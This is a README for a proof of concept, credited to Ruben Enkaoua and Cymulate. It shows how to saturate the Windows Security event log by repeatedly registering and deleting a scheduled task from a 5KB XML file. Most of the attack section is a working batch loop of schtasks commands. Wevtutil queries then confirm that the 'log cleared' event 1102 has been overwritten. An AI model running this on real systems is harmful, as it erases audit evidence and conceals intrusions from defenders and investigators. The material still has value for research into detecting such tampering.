# Security Logs Saturation
By [Ruben Enkaoua](https://x.com/rubenlabs) and [Cymulate](https://cymulate.com/)
<br>
<br>
[Original Blog: Task Scheduler New Vulnerabilities](https://cymulate.com/blog/task-scheduler-new-vulnerabilities-for-schtasks-exe/)
<br>
<br>

#### Description
<br>

An attacker can register a task with a 5KB XML file - See [TaskScheduler-Logs-Tampering](https://github.com/rubenformation/TaskScheduler-Logs-Tampering), with a low privileged user and a password, which will not run. But the log is still registered, with a 3500 bytes buffer. It is possible to overwrite the whole Security.evtx database, since it is configured to contain maximum 20MB of logs by default. 
<br>
<br>

#### Requirements
<br>

- An unprivileged user to run the task
- A working password for the XML task to be registered, event if an error is generated
- The Security Policy "Audit Other Object Access Events" is enabled
<br>

#### Command
<br>

> Run the script
```bash
# Clear the logs to test if the only log "Clear Log" EVENT ID 1102 is overwritten.
# Check if the 1102 has been generated in the Security.evtx database
wevutil qe Security /q:"*[System[EventID=1102]]" /f:text

@echo off
for /l %%i in (1,1, 2280) do ( 
    schtasks /create /tn poc /xml poc.xml /ru <user> /rp <password> >nul 2>&1 & schtasks /delete /tn poc /f >nul 2>&1
)
echo OK
```
<br>

> Check the logs
```bash
# Check if the 1102 log still remains in the Security.evtx database
wevutil qe Security /q:"*[System[EventID=1102]]" /f:text

# If the result is empty, the Security.evtx database has been overwritten. 
```
<br>

#### Notes
<br>
This code is for educational and research purposes only.<br>
The author takes no responsibility for any misuse of this code.
